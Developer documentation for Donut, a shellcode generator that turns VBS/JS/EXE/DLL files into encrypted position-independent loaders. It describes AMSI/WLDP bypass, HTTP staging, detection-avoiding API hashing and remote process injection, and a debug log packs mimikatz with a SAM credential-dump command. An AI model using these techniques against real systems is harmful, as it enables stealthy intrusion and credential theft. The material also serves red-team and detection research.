
<html>
<body>

<h3>API</h3>

<ul>
<li><code>int DonutCreate(PDONUT_CONFIG pConfig)</code></li>
<li><code>int DonutDelete(PDONUT_CONFIG pConfig)</code></li>
<li><code>const char* DonutError(int error)</code></li>
</ul>

<p>When provided with a valid configuration, <code>DonutCreate</code> will generate a shellcode to execute a VBS/JS/EXE/DLL files in-memory. If the function returns <code>DONUT_ERROR_SUCCESS</code>, the configuration will contain three components:</p>

<ol>
  <li>An encrypted <var>Instance</var></li>
  <li>An encrypted <var>Module</var></li>
  <li>A position-independent code (PIC) or shellcode with <var>Instance</var> embedded in it.</li>
</ol>

<p>The key to decrypt the <var>Module</var> is stored in the <var>Instance</var> so that if a module is discovered on a staging server by an adversary, it should not be possible to decrypt the contents without the instance. The user can disable encryption via the entropy option. <code>DonutDelete</code> will release any memory allocated by a successful call to <code>DonutCreate</code>. The <var>Instance</var> will already be attached to the PIC ready for executing in-memory, but the module may require saving to disk if the PIC will retrieve it from a remote staging server.</p>

<h3>Configuration</h3>

<p>A configuration requires a target architecture (only x86 and x86-64 are currently supported), a path to a VBS/JS/EXE/DLL file that will be executed in-memory by the shellcode, a namespace/class for a .NET assembly, including the name of a method to invoke and any parameters passed to the method. If the module will be stored on a staging server, a URL is required, but not a module name because that will be generated randomly. Unmanaged EXE files can also accept a command line, usually wrapped in quotations.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> _DONUT_CONFIG <span style='color:#800080; '>{</span>
    <span style='color:#696969; '>// general / misc options for loader</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             arch<span style='color:#800080; '>;</span>                     <span style='color:#696969; '>// target architecture</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             bypass<span style='color:#800080; '>;</span>                   <span style='color:#696969; '>// bypass option for AMSI/WDLP</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             compress<span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// engine to use when compressing file via RtlCompressBuffer</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             entropy<span style='color:#800080; '>;</span>                  <span style='color:#696969; '>// entropy/encryption level</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             fork<span style='color:#800080; '>;</span>                     <span style='color:#696969; '>// fork/create a new thread for the loader</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             format<span style='color:#800080; '>;</span>                   <span style='color:#696969; '>// output format for loader</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             exit_opt<span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// return to caller or invoke RtlExitUserProcess to terminate the host process</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             thread<span style='color:#800080; '>;</span>                   <span style='color:#696969; '>// run entrypoint of unmanaged EXE as a thread. attempts to intercept calls to exit-related API</span>
    
    <span style='color:#696969; '>// files in/out</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            input<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>    <span style='color:#696969; '>// name of input file to read and load in-memory</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            output<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>   <span style='color:#696969; '>// name of output file to save loader</span>
    
    <span style='color:#696969; '>// .NET stuff</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            runtime<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>  <span style='color:#696969; '>// runtime version to use for CLR</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            domain<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>   <span style='color:#696969; '>// name of domain to create for .NET DLL/EXE</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            cls<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>      <span style='color:#696969; '>// name of class with optional namespace for .NET DLL</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            method<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>   <span style='color:#696969; '>// name of method or DLL function to invoke for .NET DLL and unmanaged DLL</span>
    
    <span style='color:#696969; '>// command line for DLL/EXE</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            param<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>    <span style='color:#696969; '>// command line to use for unmanaged DLL/EXE and .NET DLL/EXE</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             ansi<span style='color:#800080; '>;</span>                     <span style='color:#696969; '>// param is passed to DLL function without converting to unicode</span>
    
    <span style='color:#696969; '>// HTTP staging information</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            url<span style='color:#808030; '>[</span>DONUT_MAX_URL<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>       <span style='color:#696969; '>// points to root path of where module will be stored on remote http server</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            modname<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>  <span style='color:#696969; '>// name of module written to disk for http stager</span>
    
    <span style='color:#696969; '>// DONUT_MODULE</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             mod_type<span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// VBS/JS/DLL/EXE</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             mod_len<span style='color:#800080; '>;</span>                  <span style='color:#696969; '>// size of DONUT_MODULE</span>
    DONUT_MODULE    <span style='color:#808030; '>*</span>mod<span style='color:#800080; '>;</span>                     <span style='color:#696969; '>// points to DONUT_MODULE</span>
    
    <span style='color:#696969; '>// DONUT_INSTANCE</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             inst_type<span style='color:#800080; '>;</span>                <span style='color:#696969; '>// DONUT_INSTANCE_PIC or DONUT_INSTANCE_URL</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             inst_len<span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// size of DONUT_INSTANCE</span>
    DONUT_INSTANCE  <span style='color:#808030; '>*</span>inst<span style='color:#800080; '>;</span>                    <span style='color:#696969; '>// points to DONUT_INSTANCE</span>
    
    <span style='color:#800000; font-weight:bold; '>int</span>             pic_len<span style='color:#800080; '>;</span>                  <span style='color:#696969; '>// size of loader/shellcode</span>
    <span style='color:#800000; font-weight:bold; '>void</span><span style='color:#808030; '>*</span>           pic<span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// points to loader/shellcode</span>
<span style='color:#800080; '>}</span> DONUT_CONFIG<span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>PDONUT_CONFIG<span style='color:#800080; '>;</span>
</pre>

<table border="1">
  <tr>
    <th>Member</th>
    <th>Description</th>
  </tr>
  <tr>
    <td><code>arch</code></td>
    <td>Indicates the type of assembly code to generate. <code>DONUT_ARCH_X86</code> and <code>DONUT_ARCH_X64</code> are self-explanatory. <code>DONUT_ARCH_X84</code> indicates dual-mode that combines shellcode for both X86 and AMD64. ARM64 will be supported at some point.</td>
  </tr>
  <tr>
    <td><code>bypass</code></td>
    <td>Specifies behaviour of the code responsible for bypassing AMSI and WLDP. The current options are <code>DONUT_BYPASS_SKIP</code> which indicates that no attempt be made to disable AMSI or WLDP. <code>DONUT_BYPASS_ABORT</code> indicates that failure to disable should result in aborting execution of the module. <code>DONUT_BYPASS_CONTINUE</code> indicates that even if AMSI/WDLP bypasses fail, the shellcode will continue with execution.</td>
  </tr>
  <tr>
    <td><code>compress</code></td>
    <td>The input file is compressed using <code>ntdll!RtlCompressBuffer</code>. Available engines are <code>DONUT_COMPRESS_LZNT1</code>, <code>DONUT_COMPRESS_XPRESS</code> and <code>DONUT_COMPRESS_XPRESS_HUFF</code>. Currently only available on Windows.</td>
  </tr>
  <tr>
    <td><code>fork</code></td>
    <td>Experimental feature that launches a new thread for the loader and returns to the caller. May be removed in future releases.</td>
  </tr>
  <tr>
    <td><code>format</code></td>
    <td>Specifies the output format for loader. Supported formats are <code>DONUT_FORMAT_BINARY</code>, <code>DONUT_FORMAT_BASE64</code>, <code>DONUT_FORMAT_RUBY</code>, <code>DONUT_FORMAT_C</code>, <code>DONUT_FORMAT_PYTHON</code>, <code>DONUT_FORMAT_POWERSHELL</code>, <code>DONUT_FORMAT_CSHARP</code> and <code>DONUT_FORMAT_HEX</code>. On Windows, the base64 string is copied to the clipboard.</td>
  </tr>
  <tr>
    <td><code>exit_opt</code></td>
    <td>By default, the loader will exit by simply returning to the caller and if running as a new thread, this will result in a call to <code>RtlExitUserThread.</code> Set this to <code>DONUT_OPT_EXIT_PROCESS</code> to terminate the host process via <code>RtlExitUserProcess</code></td>
  </tr>
  <tr>
    <td><code>thread</code></td>
    <td>If the file is an unmanaged EXE, this tells the loader to run the entrypoint as a thread. It also attempts to intercept calls to exit-related API stored in the Import Address Table by replacing the pointers to <code>RtlExitUserThread</code>. However, hooking via IAT is generally unreliable and donut may use code splicing or hooking in the future.</td>
  </tr>
  
  <tr>
    <td><code>input</code></td>
    <td>The path of a supported file type: VBS/JS/EXE/DLL.</td>
  </tr>
  <tr>
    <td><code>output</code></td>
    <td>The path of where to save the shellcode/loader.</td>
  </tr>
  
  <tr>
    <td><code>runtime</code></td>
    <td>The CLR runtime version to use for the .NET assembly. If none is provided, donut will try read from the COM directory or meta header inside the PE file. If that fails, v4.0.30319 is used by default.</td>
  </tr>
  <tr>
    <td><code>domain</code></td>
    <td>AppDomain name to create. If one is not specified by the caller, it will be generated randomly. If entropy is disabled, it will be set to "AAAAAAAA"</td>
  </tr>
  <tr>
    <td><code>cls</code></td>
    <td>The class name with method to invoke. A namespace is optional. e.g: <var>namespace.class</var></td>
  </tr>
  <tr>
    <td><code>method</code></td>
    <td>The method that will be invoked by the shellcode once a .NET assembly is loaded into memory. This also holds the name of an exported API if the module is an unmanaged DLL.</td>
  </tr>
  
  <tr>
    <td><code>param</code></td>
    <td>Contains a list of parameters for the .NET method or DLL function. Each separated by semi-colon or comma. For unmanaged EXE files, a 4-byte string is generated randomly to act as the module name. If entropy is disabled, this will be "AAAA"</td>
  </tr>
  <tr>
    <td><code>ansi</code></td>
    <td>By default, the <code>param</code> string is converted to unicode format. With this set to 1, the string is not converted. This option only applies to unmanaged DLL functions.</td>
  </tr>
  
  <tr>
    <td><code>url</code></td>
    <td>If the <code>type</code> is <code>DONUT_INSTANCE_URL</code>, this should contain the server and path of where module will be stored. e.g: https://www.staging-server.com/modules/</td>
  </tr>

  <tr>
    <td><code>modname</code></td>
    <td>If the <code>type</code> is <code>DONUT_INSTANCE_URL</code>, this will contain the name of the module for where to save the contents of <code>mod</code> to disk. If none is provided by the user, it will be generated randomly. If entropy is disabled, it will be set to "AAAAAAAA"0</td>
  </tr>
  <tr>
    <td><code>mod_type</code></td>
    <td>Indicates the type of file detected by <code>DonutCreate</code>. For example, <code>DONUT_MODULE_VBS</code> indicates a VBScript file.</td>
  </tr>
  <tr>
    <td><code>mod_len</code></td>
    <td>The total size of the <var>Module</var> pointed to by <code>mod</code>.</td>
  </tr>
  <tr>
    <td><code>mod</code></td>
    <td>Points to encrypted <var>Module</var>. If the <code>type</code> is <code>DONUT_INSTANCE_URL</code>, this should be saved to file using the <code>modname</code> and accessible via HTTP server.</td>
  </tr>
  
  <tr>
    <td><code>inst_type</code></td>
    <td><code>DONUT_INSTANCE_PIC</code> indicates a self-contained payload which means the file is embedded. <code>DONUT_INSTANCE_URL</code> indicates the file is stored on a remote HTTP server.</td>
  </tr>
  <tr>
    <td><code>inst_len</code></td>
    <td>The total size of the <var>Instance</var> pointed to by <code>inst</code>.</td>
  </tr>
  <tr>
    <td><code>inst</code></td>
    <td>Points to an encrypted <var>Instance</var> after a successful call to <code>DonutCreate</code>. Since it's already attached to the <code>pic</code>, this is only provided for debugging purposes.</td>
  </tr>
  
  <tr>
    <td><code>pic_len</code></td>
    <td>The size of data pointed to by <code>pic</code>.</td>
  </tr>
  <tr>
    <td><code>pic</code></td>
    <td>Points to the loader/shellcode. This should be injected into a remote process.</td>
  </tr>
</table>

<p>Everything that follows here concerns internal workings of Donut and is not required to generate the loader.</p>

<h3>Instance</h3>

<p>The position-independent code will always contain an <var>Instance</var> which can be viewed simply as a configuration for the code itself. It will contain all the data that would normally be stored on the stack or in the <code>.data</code> and <code>.rodata</code> sections of an executable. Once the main code executes, if encryption is enabled, it will decrypt the data before attempting to resolve the address of API functions. If successful, it will check if an executable file is embedded or must be downloaded from a remote staging server. To verify successful decryption of a module, a randomly generated string stored in the <code>sig</code> field is hashed using <var>Maru</var> and compared with the value of <code>mac</code>. The data will be decompressed if required and only then is it loaded into memory for execution.</p>

<h3>Module</h3>

<p>Modules can be embedded in an <var>Instance</var> or stored on a remote HTTP server.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> _DONUT_MODULE <span style='color:#800080; '>{</span>
    <span style='color:#800000; font-weight:bold; '>int</span>      type<span style='color:#800080; '>;</span>                            <span style='color:#696969; '>// EXE/DLL/JS/VBS</span>
    <span style='color:#800000; font-weight:bold; '>int</span>      thread<span style='color:#800080; '>;</span>                          <span style='color:#696969; '>// run entrypoint of unmanaged EXE as a thread</span>
    <span style='color:#800000; font-weight:bold; '>int</span>      compress<span style='color:#800080; '>;</span>                        <span style='color:#696969; '>// indicates engine used for compression</span>
    
    <span style='color:#800000; font-weight:bold; '>char</span>     runtime<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>         <span style='color:#696969; '>// runtime version for .NET EXE/DLL</span>
    <span style='color:#800000; font-weight:bold; '>char</span>     domain<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>          <span style='color:#696969; '>// domain name to use for .NET EXE/DLL</span>
    <span style='color:#800000; font-weight:bold; '>char</span>     cls<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>             <span style='color:#696969; '>// name of class and optional namespace for .NET EXE/DLL</span>
    <span style='color:#800000; font-weight:bold; '>char</span>     method<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>          <span style='color:#696969; '>// name of method to invoke for .NET DLL or api for unmanaged DLL</span>
    
    <span style='color:#800000; font-weight:bold; '>char</span>     param<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>           <span style='color:#696969; '>// string parameters for both managed and unmanaged DLL/EXE</span>
    <span style='color:#800000; font-weight:bold; '>int</span>      ansi<span style='color:#800080; '>;</span>                            <span style='color:#696969; '>// don't convert command line to unicode for unmanaged DLL function</span>
    
    <span style='color:#800000; font-weight:bold; '>char</span>     sig<span style='color:#808030; '>[</span>DONUT_SIG_LEN<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>              <span style='color:#696969; '>// string to verify decryption</span>
    uint64_t mac<span style='color:#800080; '>;</span>                             <span style='color:#696969; '>// hash of sig, to verify decryption was ok</span>
    
    uint32_t zlen<span style='color:#800080; '>;</span>                            <span style='color:#696969; '>// compressed size of EXE/DLL/JS/VBS file</span>
    uint32_t len<span style='color:#800080; '>;</span>                             <span style='color:#696969; '>// real size of EXE/DLL/JS/VBS file</span>
    uint8_t  data<span style='color:#808030; '>[</span><span style='color:#008c00; '>4</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>                         <span style='color:#696969; '>// data of EXE/DLL/JS/VBS file</span>
<span style='color:#800080; '>}</span> DONUT_MODULE<span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>PDONUT_MODULE<span style='color:#800080; '>;</span>
</pre>

<h3>API Hashing</h3>

<p>A hash function called <em>Maru</em> is used to resolve the address of API at runtime. It uses a Davies-Meyer construction and the SPECK block cipher to derive a 64-bit hash from an API string. The padding is similar to what's used by MD4 and MD5 except only 32-bits of the string length are stored in the buffer instead of 64-bits. An initial value (IV) chosen randomly ensures the 64-bit API hashes are unique for each instance and cannot be used for detection of Donut. Future releases will likely support alternative methods of resolving address of API to decrease chance of detection.</p>

<h3>Encryption</h3>

<p>The following structure is used to hold a master key, counter and nonce for Donut, which are generated randomly.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> _DONUT_CRYPT <span style='color:#800080; '>{</span>
    <span style='color:#603000; '>BYTE</span>    mk<span style='color:#808030; '>[</span>DONUT_KEY_LEN<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>   <span style='color:#696969; '>// master key</span>
    <span style='color:#603000; '>BYTE</span>    ctr<span style='color:#808030; '>[</span>DONUT_BLK_LEN<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>  <span style='color:#696969; '>// counter + nonce</span>
<span style='color:#800080; '>}</span> DONUT_CRYPT<span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>PDONUT_CRYPT<span style='color:#800080; '>;</span>
</pre>

<p>Chaskey, a 128-bit block cipher with support for 128-bit keys, is used in Counter (CTR) mode to decrypt a <var>Module</var> or an <var>Instance</var> at runtime. If an adversary discovers a staging server, it should not be feasible for them to decrypt a donut module without the key which is stored in the donut payload. </p>

<h3>Debugging payload</h3>

<p>The payload is capable of displaying detailed information about each step executing a file in-memory and can be useful in tracking down bugs. To build a debug-enabled executable, specify the debug label with nmake/make for both donut.c and payload.c.</p>

<pre>
nmake debug -f Makefile.msvc
make debug -f Makefile.mingw
</pre>

<p>Use donut to create a payload as you normally would and a file called <code>instance</code> will be saved to disk.</p> 

<pre>
  [ Donut shellcode generator v0.9.3
  [ Copyright (c) 2019 TheWover, Odzhan

DEBUG: donut.c:932:DonutCreate(): Entering.
DEBUG: donut.c:934:DonutCreate(): Validating configuration and path of file PDONUT_CONFIG: 00000057438FF370
DEBUG: donut.c:950:DonutCreate(): Validating instance type 1
DEBUG: donut.c:958:DonutCreate(): Validating format
DEBUG: donut.c:963:DonutCreate(): Validating compression
DEBUG: donut.c:972:DonutCreate(): Validating entropy level
DEBUG: donut.c:1012:DonutCreate(): Validating architecture
DEBUG: donut.c:1022:DonutCreate(): Validating AMSI/WDLP bypass option
DEBUG: donut.c:293:get_file_info(): Entering.
DEBUG: donut.c:302:get_file_info(): Checking extension of C:\hub\mimikatz_trunk\x64\mimikatz.exe
DEBUG: donut.c:309:get_file_info(): Extension is ".exe"
DEBUG: donut.c:325:get_file_info(): Module is EXE
DEBUG: donut.c:337:get_file_info(): Mapping C:\hub\mimikatz_trunk\x64\mimikatz.exe into memory
DEBUG: donut.c:232:map_file(): Reading size of file : C:\hub\mimikatz_trunk\x64\mimikatz.exe
DEBUG: donut.c:241:map_file(): Opening C:\hub\mimikatz_trunk\x64\mimikatz.exe
DEBUG: donut.c:251:map_file(): Mapping 1013912 bytes for C:\hub\mimikatz_trunk\x64\mimikatz.exe
DEBUG: donut.c:346:get_file_info(): Checking DOS header
DEBUG: donut.c:352:get_file_info(): Checking NT header
DEBUG: donut.c:358:get_file_info(): Checking IMAGE_DATA_DIRECTORY
DEBUG: donut.c:366:get_file_info(): Checking characteristics
DEBUG: donut.c:443:get_file_info(): Reading fragment and workspace size
DEBUG: donut.c:449:get_file_info(): workspace size : 1415999 | fragment size : 5161
DEBUG: donut.c:452:get_file_info(): Allocating meory for compressed file
DEBUG: donut.c:455:get_file_info(): Compressing data
DEBUG: donut.c:462:get_file_info(): Original : 1013912 | Compressed : 478726
DEBUG: donut.c:466:get_file_info(): Reduced by 52%
DEBUG: donut.c:478:get_file_info(): Leaving.
DEBUG: donut.c:1043:DonutCreate(): Validating architecture 3 for DLL/EXE 2
DEBUG: donut.c:1083:DonutCreate(): Creating module
DEBUG: donut.c:589:CreateModule(): Entering.
DEBUG: donut.c:596:CreateModule(): Allocating 480054 bytes of memory for DONUT_MODULE
DEBUG: donut.c:672:CreateModule(): Setting the length of module data
DEBUG: donut.c:676:CreateModule(): Copying data
DEBUG: donut.c:689:CreateModule(): Leaving.
DEBUG: donut.c:1090:DonutCreate(): Creating instance
DEBUG: donut.c:700:CreateInstance(): Entering.
DEBUG: donut.c:703:CreateInstance(): Allocating space for instance
DEBUG: donut.c:710:CreateInstance(): The size of module is 480054 bytes. Adding to size of instance.
DEBUG: donut.c:713:CreateInstance(): Total length of instance : 483350
DEBUG: donut.c:725:CreateInstance(): Generating random key for instance
DEBUG: donut.c:731:CreateInstance(): Generating random key for module
DEBUG: donut.c:737:CreateInstance(): Generating random string to verify decryption
DEBUG: donut.c:742:CreateInstance(): Generating random IV for Maru hash
DEBUG: donut.c:748:CreateInstance(): Generating hashes for API using IV: B02EE37A85853A38
DEBUG: donut.c:761:CreateInstance(): Hash for kernel32.dll    : LoadLibraryA           = 91A159687016A1E1
DEBUG: donut.c:761:CreateInstance(): Hash for kernel32.dll    : GetProcAddress         = 3468293450D00851
DEBUG: donut.c:761:CreateInstance(): Hash for kernel32.dll    : GetModuleHandleA       = 2BF42B5E41FD4C59
DEBUG: donut.c:761:CreateInstance(): Hash for kernel32.dll    : VirtualAlloc           = 217F8AA0B37F365F
DEBUG: donut.c:761:CreateInstance(): Hash for kernel32.dll    : VirtualFree            = 2D2DA8EDBA73032F
DEBUG: donut.c:761:CreateInstance(): Hash for kernel32.dll    : VirtualQuery           = 638709B317BAFB30
DEBUG: donut.c:761:CreateInstance(): Hash for kernel32.dll    : VirtualProtect         = 2066969382C2A49A
DEBUG: donut.c:761:CreateInstance(): Hash for kernel32.dll    : Sleep                  = CA9C9BE9BD8EA780
DEBUG: donut.c:761:CreateInstance(): Hash for kernel32.dll    : MultiByteToWideChar    = 76176A35551EE10D
DEBUG: donut.c:761:CreateInstance(): Hash for kernel32.dll    : GetUserDefaultLCID     = 538D12A8832092B6
DEBUG: donut.c:761:CreateInstance(): Hash for kernel32.dll    : WaitForSingleObject    = 3F534C18FC10DA5E
DEBUG: donut.c:761:CreateInstance(): Hash for kernel32.dll    : CreateThread           = A52F1F4467587954
DEBUG: donut.c:761:CreateInstance(): Hash for shell32.dll     : CommandLineToArgvW     = 6AD83BB027CB8950
DEBUG: donut.c:761:CreateInstance(): Hash for oleaut32.dll    : SafeArrayCreate        = 075C6A327F3D52DB
DEBUG: donut.c:761:CreateInstance(): Hash for oleaut32.dll    : SafeArrayCreateVector  = AD03505359068DDD
DEBUG: donut.c:761:CreateInstance(): Hash for oleaut32.dll    : SafeArrayPutElement    = D31A2728E6D7F91B
DEBUG: donut.c:761:CreateInstance(): Hash for oleaut32.dll    : SafeArrayDestroy       = 88B9E7C080529C23
DEBUG: donut.c:761:CreateInstance(): Hash for oleaut32.dll    : SafeArrayGetLBound     = C05B40A05E75B7AF
DEBUG: donut.c:761:CreateInstance(): Hash for oleaut32.dll    : SafeArrayGetUBound     = 476867E50311505F
DEBUG: donut.c:761:CreateInstance(): Hash for oleaut32.dll    : SysAllocString         = D9CFF4875AB529CE
DEBUG: donut.c:761:CreateInstance(): Hash for oleaut32.dll    : SysFreeString          = 0B58E092C382C1D8
DEBUG: donut.c:761:CreateInstance(): Hash for oleaut32.dll    : LoadTypeLib            = 0FCAC4B0A7371A6E
DEBUG: donut.c:761:CreateInstance(): Hash for wininet.dll     : InternetCrackUrlA      = A94916E3CB631C1D
DEBUG: donut.c:761:CreateInstance(): Hash for wininet.dll     : InternetOpenA          = DC37FFCDEBF7DFED
DEBUG: donut.c:761:CreateInstance(): Hash for wininet.dll     : InternetConnectA       = 5A48A3BD4290F724
DEBUG: donut.c:761:CreateInstance(): Hash for wininet.dll     : InternetSetOptionA     = E2F204B2C01D6089
DEBUG: donut.c:761:CreateInstance(): Hash for wininet.dll     : InternetReadFile       = 74B5DB338A4AF815
DEBUG: donut.c:761:CreateInstance(): Hash for wininet.dll     : InternetCloseHandle    = 60B462D7520D7EC8
DEBUG: donut.c:761:CreateInstance(): Hash for wininet.dll     : HttpOpenRequestA       = 8FA067B6C450A239
DEBUG: donut.c:761:CreateInstance(): Hash for wininet.dll     : HttpSendRequestA       = 48019ACD2CD26948
DEBUG: donut.c:761:CreateInstance(): Hash for wininet.dll     : HttpQueryInfoA         = 42A7B59357E517C7
DEBUG: donut.c:761:CreateInstance(): Hash for mscoree.dll     : CorBindToRuntime       = B7A45FEF69C28901
DEBUG: donut.c:761:CreateInstance(): Hash for mscoree.dll     : CLRCreateInstance      = F356C5B73892175F
DEBUG: donut.c:761:CreateInstance(): Hash for ole32.dll       : CoInitializeEx         = 9145E115B31BBFFC
DEBUG: donut.c:761:CreateInstance(): Hash for ole32.dll       : CoCreateInstance       = 262950647E303460
DEBUG: donut.c:761:CreateInstance(): Hash for ole32.dll       : CoUninitialize         = 1A99B4A712B76012
DEBUG: donut.c:761:CreateInstance(): Hash for ntdll.dll       : RtlEqualUnicodeString  = BDD45D8283900E74
DEBUG: donut.c:761:CreateInstance(): Hash for ntdll.dll       : RtlEqualString         = 77F04BB55F5347A8
DEBUG: donut.c:761:CreateInstance(): Hash for ntdll.dll       : RtlUnicodeStringToAnsiString = 4AF81E45D5D95835
DEBUG: donut.c:761:CreateInstance(): Hash for ntdll.dll       : RtlInitUnicodeString   = E1A7F96405BB7106
DEBUG: donut.c:761:CreateInstance(): Hash for ntdll.dll       : RtlExitUserThread      = 94BD36C7C295FC52
DEBUG: donut.c:761:CreateInstance(): Hash for ntdll.dll       : RtlExitUserProcess     = 6F98A33E6DA4986C
DEBUG: donut.c:761:CreateInstance(): Hash for ntdll.dll       : RtlCreateUnicodeString = 88A2232B0869DF41
DEBUG: donut.c:761:CreateInstance(): Hash for ntdll.dll       : RtlGetCompressionWorkSpaceSize = 4E8E2A23D41A8E6B
DEBUG: donut.c:761:CreateInstance(): Hash for ntdll.dll       : RtlDecompressBufferEx  = F2031AF815C04AEC
DEBUG: donut.c:901:CreateInstance(): Copying module data to instance
DEBUG: donut.c:906:CreateInstance(): encrypting instance
DEBUG: donut.c:918:CreateInstance(): Leaving.
DEBUG: donut.c:1098:DonutCreate(): Saving instance to file
DEBUG: donut.c:1131:DonutCreate(): PIC size : 501741
DEBUG: donut.c:1138:DonutCreate(): Inserting opcodes
DEBUG: donut.c:1174:DonutCreate(): Copying 18359 bytes of x86 + amd64 shellcode
DEBUG: donut.c:1234:DonutCreate(): Saving loader as raw data
DEBUG: donut.c:270:unmap_file(): Releasing compressed data
DEBUG: donut.c:274:unmap_file(): Unmapping
DEBUG: donut.c:277:unmap_file(): Closing
DEBUG: donut.c:1273:DonutCreate(): Leaving.
  [ Instance type : PIC
  [ Module file   : "C:\hub\mimikatz_trunk\x64\mimikatz.exe"
  [ File type     : EXE
  [ Parameters    : lsadump::sam coffee exit
  [ Target CPU    : x86+amd64
  [ AMSI/WDLP     : continue
  [ Shellcode     : "loader.bin"
DEBUG: donut.c:1281:DonutDelete(): Entering.
DEBUG: donut.c:1300:DonutDelete(): Leaving.
</pre>

<p>Pass the instance as a parameter to loader.exe and it will run on the host system as if in a target environment.</p>

<pre>
C:\hub\donut\loader>loader ..\instance
Running...
DEBUG: loader.c:70:MainProc(): Maru IV : B02EE37A85853A38
DEBUG: loader.c:73:MainProc(): Resolving address for VirtualAlloc() : 217F8AA0B37F365F
DEBUG: loader.c:77:MainProc(): Resolving address for VirtualFree() : 2D2DA8EDBA73032F
DEBUG: loader.c:81:MainProc(): Resolving address for RtlExitUserProcess() : 6F98A33E6DA4986C
DEBUG: loader.c:90:MainProc(): VirtualAlloc : 00007FF950FDA190 VirtualFree : 00007FF950FDA180
DEBUG: loader.c:92:MainProc(): Allocating 483350 bytes of RW memory
DEBUG: loader.c:104:MainProc(): Copying 483350 bytes of data to memory 000001FE756B0000
DEBUG: loader.c:108:MainProc(): Zero initializing PDONUT_ASSEMBLY
DEBUG: loader.c:117:MainProc(): Decrypting 483350 bytes of instance
DEBUG: loader.c:124:MainProc(): Generating hash to verify decryption
DEBUG: loader.c:126:MainProc(): Instance : 6A28D321377C24AB | Result : 6A28D321377C24AB
DEBUG: loader.c:133:MainProc(): Resolving LoadLibraryA
DEBUG: loader.c:139:MainProc(): Loading 1 of 5 : ole32.dll ...
DEBUG: loader.c:139:MainProc(): Loading 2 of 5 : oleaut32.dll ...
DEBUG: loader.c:139:MainProc(): Loading 3 of 5 : wininet.dll ...
DEBUG: loader.c:139:MainProc(): Loading 4 of 5 : mscoree.dll ...
DEBUG: loader.c:139:MainProc(): Loading 5 of 5 : shell32.dll ...
DEBUG: loader.c:143:MainProc(): Resolving 45 API
DEBUG: loader.c:146:MainProc(): Resolving API address for 3468293450D00851
DEBUG: loader.c:146:MainProc(): Resolving API address for 2BF42B5E41FD4C59
DEBUG: loader.c:146:MainProc(): Resolving API address for 217F8AA0B37F365F
DEBUG: loader.c:146:MainProc(): Resolving API address for 2D2DA8EDBA73032F
DEBUG: loader.c:146:MainProc(): Resolving API address for 638709B317BAFB30
DEBUG: loader.c:146:MainProc(): Resolving API address for 2066969382C2A49A
DEBUG: loader.c:146:MainProc(): Resolving API address for CA9C9BE9BD8EA780
DEBUG: loader.c:146:MainProc(): Resolving API address for 76176A35551EE10D
DEBUG: loader.c:146:MainProc(): Resolving API address for 538D12A8832092B6
DEBUG: loader.c:146:MainProc(): Resolving API address for 3F534C18FC10DA5E
DEBUG: loader.c:146:MainProc(): Resolving API address for A52F1F4467587954
